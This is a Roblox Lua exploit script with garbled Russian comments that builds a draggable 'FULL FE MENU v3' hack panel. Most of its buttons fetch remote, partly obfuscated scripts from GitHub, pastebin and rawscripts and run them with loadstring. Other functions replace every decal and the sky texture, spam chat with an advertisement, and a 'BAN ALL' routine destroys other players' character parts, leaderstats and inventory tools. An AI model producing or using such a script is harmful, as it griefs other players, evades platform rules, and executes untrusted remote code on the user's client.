local targetTextureID = "138455549096289"
local rbxAssetURL = "rbxassetid://" .. targetTextureID
local menuTextureID = "78590385794551"
local menuTextureURL = "rbxassetid://" .. menuTextureID

if not _G.EnglishMenu then
    _G.EnglishMenu = true
    
    -- ========== –í–°–ï –§–£–ù–ö–¶–ò–ò ========== --
    
    -- 1. FE GONER Executor
    local function executeFEGoner()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner", true))()
        end)
    end

    -- 2. Mobile Keyboard Executor
    local function executeMobileKeyboard()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
        end)
    end

    -- 3. Knife FE v4 Executor
    local function executeKnifeFE()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753", true))()
        end)
    end

    -- 4. SSP Executor
    local function executeSSP()
        pcall(function()
            loadstring(game:HttpGet("https://pastebin.com/raw/E5k09bh1", true))()
        end)
    end

    -- 5. LALOL Hub Executor
    local function executeLALOLHub()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script", true))()
        end)
    end

    -- 6. AK47 FE Executor
    local function executeAK47FE()
        pcall(function()
            loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47", true))()
        end)
    end

    -- 7. Caducus FE Executor
    local function executeCaducusFE()
        pcall(function()
            loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Caducus-The-fallen-god-REQUIRES-REANIMATION-TO-WORK-47600", true))()
        end)
    end

    -- 8. FE Animations Executor
    local function executeFEAnimations()
        pcall(function()
            loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/UFE', true))()
        end)
    end

    -- 9. Decal Spam Function
    local function decalSpam()
        pcall(function()
            local replacedDecals = 0
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("Decal") or obj:IsA("Texture") then
                    pcall(function()
                        obj.Texture = rbxAssetURL
                        replacedDecals += 1
                    end)
                end
            end
        end)
    end

    -- 10. Sky Texture Replacement
    local function replaceSky()
        pcall(function()
            local lighting = game:GetService("Lighting")
            local sky = lighting:FindFirstChildOfClass("Sky") or Instance.new("Sky")
            sky.Parent = lighting
            sky.SkyboxBk = rbxAssetURL
            sky.SkyboxDn = rbxAssetURL
            sky.SkyboxFt = rbxAssetURL
            sky.SkyboxLf = rbxAssetURL
            sky.SkyboxRt = rbxAssetURL
            sky.SkyboxUp = rbxAssetURL
        end)
    end

    -- 11. TEAM SPAM FUNCTION (20 –°–û–û–ë–©–ï–ù–ò–ô) --
    local function spamTeam()
        pcall(function()
            for i = 1, 20 do
                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                    "TEAM This0neKid Join today! [" .. i .. "/20]", "All"
                )
                wait(0.5)
            end
        end)
    end

    -- 12. BAN ALL FUNCTION (–£–õ–£–ß–®–ï–ù–ù–ê–Ø) --
    local function banAll()
        pcall(function()
            local localPlayer = game:GetService("Players").LocalPlayer
            local deleted = 0
            
            -- –£–¥–∞–ª—è–µ–º –≤—Å–µ –æ–±—ä–µ–∫—Ç—ã –¥—Ä—É–≥–∏—Ö –∏–≥—Ä–æ–∫–æ–≤ –≤ Workspace
            for _, obj in ipairs(workspace:GetDescendants()) do
                if obj:IsA("BasePart") or obj:IsA("Model") or obj:IsA("Accessory") then
                    -- –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –æ–±—ä–µ–∫—Ç –Ω–µ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –ª–æ–∫–∞–ª—å–Ω–æ–º—É –∏–≥—Ä–æ–∫—É
                    if obj:FindFirstAncestorOfClass("Model") then
                        local player = game:GetService("Players"):GetPlayerFromCharacter(obj:FindFirstAncestorOfClass("Model"))
                        if player and player ~= localPlayer then
                            pcall(function()
                                obj:Destroy()
                                deleted += 1
                            end)
                        end
                    end
                end
            end
            
            -- –£–¥–∞–ª—è–µ–º –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç—ã –≤ Backpack –¥—Ä—É–≥–∏—Ö –∏–≥—Ä–æ–∫–æ–≤
            for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
                if player ~= localPlayer then
                    -- –£–¥–∞–ª—è–µ–º leaderstats –∏–≥—Ä–æ–∫–∞
                    if player:FindFirstChild("leaderstats") then
                        player.leaderstats:Destroy()
                        deleted += 1
                    end
                    
                    -- –£–¥–∞–ª—è–µ–º Backpack
                    if player:FindFirstChild("Backpack") then
                        for _, tool in ipairs(player.Backpack:GetDescendants()) do
                            pcall(function()
                                tool:Destroy()
                                deleted += 1
                            end)
                        end
                    end
                end
            end
            
            -- –°–æ–æ–±—â–µ–Ω–∏–µ –æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(
                "‚úÖ BAN ALL: Deleted " .. deleted .. " objects from other players", "All"
            )
        end)
    end

    -- ========== –£–í–ï–õ–ò–ß–ï–ù–ù–û–ï –ú–ï–ù–Æ –° BAN ALL ========== --
    
    local function createFullMenu()
        if game:GetService("CoreGui"):FindFirstChild("FullHackMenu") then
            game:GetService("CoreGui").FullHackMenu:Destroy()
        end

        local ScreenGui = Instance.new("ScreenGui")
        ScreenGui.Name = "FullHackMenu"
        ScreenGui.Parent = game:GetService("CoreGui")
        ScreenGui.ResetOnSpawn = false

        local MainFrame = Instance.new("Frame")
        MainFrame.Name = "MainFrame"
        MainFrame.Size = UDim2.new(0.5, 0, 0.9, 0) -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        MainFrame.Position = UDim2.new(0.01, 0, 0.05, 0) -- –°–¥–≤–∏–Ω—É—Ç–æ –≤—ã—à–µ
        MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
        MainFrame.BorderSizePixel = 2
        MainFrame.BorderColor3 = Color3.fromRGB(255, 200, 0)
        MainFrame.Active = true
        MainFrame.Parent = ScreenGui

        -- –¢–ï–ö–°–¢–£–†–ê –§–û–ù–ê –ú–ï–ù–Æ
        local menuBackground = Instance.new("ImageLabel")
        menuBackground.Image = menuTextureURL
        menuBackground.Size = UDim2.new(1, 0, 1, 0)
        menuBackground.BackgroundTransparency = 1
        menuBackground.Parent = MainFrame

        local Title = Instance.new("TextLabel")
        Title.Size = UDim2.new(1, 0, 0.05, 0)
        Title.Text = "üî• FULL FE MENU v3"
        Title.TextColor3 = Color3.fromRGB(255, 255, 0)
        Title.BackgroundTransparency = 1
        Title.Font = Enum.Font.GothamBold
        Title.TextSize = 18 -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        Title.Parent = MainFrame

        -- ScrollFrame –¥–ª—è –≤—Å–µ—Ö –∫–Ω–æ–ø–æ–∫
        local ScrollFrame = Instance.new("ScrollingFrame")
        ScrollFrame.Size = UDim2.new(0.95, 0, 0.85, 0) -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        ScrollFrame.Position = UDim2.new(0.025, 0, 0.08, 0) -- –°–¥–≤–∏–Ω—É—Ç–æ –Ω–∏–∂–µ
        ScrollFrame.CanvasSize = UDim2.new(0, 0, 3.5, 0) -- –£–≤–µ–ª–∏—á–µ–Ω–æ –¥–ª—è –≤—Å–µ—Ö –∫–Ω–æ–ø–æ–∫
        ScrollFrame.ScrollBarThickness = 8 -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        ScrollFrame.BackgroundTransparency = 1
        ScrollFrame.Parent = MainFrame

        -- –í–°–ï –ö–ù–û–ü–ö–ò (–° –î–û–ë–ê–í–õ–ï–ù–ù–û–ô BAN ALL)
        local buttons = {
            {Text = "üíÄ FE GONER", Color = Color3.fromRGB(255, 50, 50), Func = executeFEGoner},
            {Text = "üì± MOBILE KEYBOARD", Color = Color3.fromRGB(100, 200, 255), Func = executeMobileKeyboard},
            {Text = "üî™ KNIFE FE v4", Color = Color3.fromRGB(200, 0, 0), Func = executeKnifeFE},
            {Text = "üïµÔ∏è SSP SCRIPT", Color = Color3.fromRGB(0, 100, 200), Func = executeSSP},
            {Text = "üé® DECAL SPAM", Color = Color3.fromRGB(255, 150, 50), Func = decalSpam},
            {Text = "üåå SKY REPLACE", Color = Color3.fromRGB(150, 100, 255), Func = replaceSky},
            {Text = "‚ö° CADUCUS FE", Color = Color3.fromRGB(139, 0, 139), Func = executeCaducusFE},
            {Text = "üî´ AK47 FE", Color = Color3.fromRGB(150, 0, 0), Func = executeAK47FE},
            {Text = "üíÉ FE ANIMATIONS", Color = Color3.fromRGB(255, 100, 0), Func = executeFEAnimations},
            {Text = "üïµÔ∏è LALOL HUB", Color = Color3.fromRGB(0, 100, 255), Func = executeLALOLHub},
            {Text = "üì¢ SPAM TEAM (x20)", Color = Color3.fromRGB(0, 200, 0), Func = spamTeam},
            {Text = "‚õî BAN ALL", Color = Color3.fromRGB(200, 0, 0), Func = banAll}
        }

        for i, btn in ipairs(buttons) do
            local buttonFrame = Instance.new("Frame")
            buttonFrame.Size = UDim2.new(1, 0, 0.08, 0) -- –£–º–µ–Ω—å—à–µ–Ω–æ –¥–ª—è –±–æ–ª—å—à–µ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞
            buttonFrame.Position = UDim2.new(0, 0, (i-1)*0.09, 0) -- –£–º–µ–Ω—å—à–µ–Ω–æ —Ä–∞—Å—Å—Ç–æ—è–Ω–∏–µ
            buttonFrame.BackgroundTransparency = 1
            buttonFrame.Parent = ScrollFrame

            local button = Instance.new("TextButton")
            button.Size = UDim2.new(1, 0, 0.8, 0)
            button.Position = UDim2.new(0, 0, 0.1, 0)
            button.Text = btn.Text
            button.BackgroundColor3 = btn.Color
            button.TextColor3 = Color3.fromRGB(255, 255, 255)
            button.Font = Enum.Font.GothamBold
            button.TextSize = 14 -- –£–≤–µ–ª–∏—á–µ–Ω–æ
            button.BorderSizePixel = 0
            button.Parent = buttonFrame
            button.MouseButton1Click:Connect(btn.Func)

            -- –≠—Ñ—Ñ–µ–∫—Ç –ø—Ä–∏ –Ω–∞–≤–µ–¥–µ–Ω–∏–∏
            button.MouseEnter:Connect(function()
                button.BackgroundColor3 = Color3.fromRGB(
                    math.min(btn.Color.R * 255 + 30, 255),
                    math.min(btn.Color.G * 255 + 30, 255), 
                    math.min(btn.Color.B * 255 + 30, 255)
                ) / 255
            end)

            button.MouseLeave:Connect(function()
                button.BackgroundColor3 = btn.Color
            end)
        end

        -- –ò–ù–§–û –¢–ï–ö–°–¢
        local infoText = Instance.new("TextLabel")
        infoText.Size = UDim2.new(0.9, 0, 0.25, 0)
        infoText.Position = UDim2.new(0.05, 0, 1.35, 0)
        infoText.Text = "‚ö†Ô∏è WARNING:\n‚Ä¢ BAN ALL: Deletes other players' objects and leaderstats\n‚Ä¢ Use only in private servers\n‚Ä¢ May cause detection"
        infoText.TextColor3 = Color3.fromRGB(255, 100, 100)
        infoText.BackgroundTransparency = 1
        infoText.Font = Enum.Font.Gotham
        infoText.TextSize = 11 -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        infoText.TextXAlignment = Enum.TextXAlignment.Left
        infoText.Parent = ScrollFrame

        -- –ö–Ω–æ–ø–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è
        local CloseButton = Instance.new("TextButton")
        CloseButton.Size = UDim2.new(0.2, 0, 0.07, 0) -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        CloseButton.Position = UDim2.new(0.7, 0, 0.01, 0) -- –°–¥–≤–∏–Ω—É—Ç–æ
        CloseButton.Text = "‚ùå CLOSE"
        CloseButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        CloseButton.Font = Enum.Font.GothamBold
        CloseButton.TextSize = 14 -- –£–≤–µ–ª–∏—á–µ–Ω–æ
        CloseButton.BorderSizePixel = 0
        CloseButton.Parent = MainFrame
        CloseButton.MouseButton1Click:Connect(function()
            ScreenGui:Destroy()
        end)

        -- ========== –°–ò–°–¢–ï–ú–ê –ü–ï–†–ï–¢–ê–°–ö–ò–í–ê–ù–ò–Ø ========== --
        
        local UserInputService = game:GetService("UserInputService")
        local dragging = false
        local dragStart = Vector3.new()
        local startPos = MainFrame.Position

        MainFrame.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = Vector3.new(input.Position.X, input.Position.Y, 0)
                startPos = MainFrame.Position
            end
        end)

        MainFrame.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.Touch then
                dragging = false
            end
        end)

        UserInputService.InputChanged:Connect(function(input)
            if dragging and input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStart
                MainFrame.Position = UDim2.new(
                    startPos.X.Scale, 
                    startPos.X.Offset + delta.X,
                    startPos.Y.Scale, 
                    startPos.Y.Offset + delta.Y
                )
            end
        end)
    end

    -- –°–æ–∑–¥–∞–µ–º –ø–æ–ª–Ω–æ–µ –º–µ–Ω—é
    createFullMenu()

    -- –ê–≤—Ç–æ-–≤–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–æ—Å–ª–µ respawn
    game:GetService("Players").LocalPlayer.CharacterAdded:Connect(function()
        task.wait(2)
        if not game:GetService("CoreGui"):FindFirstChild("FullHackMenu") then
            createFullMenu()
        end
    end)
end
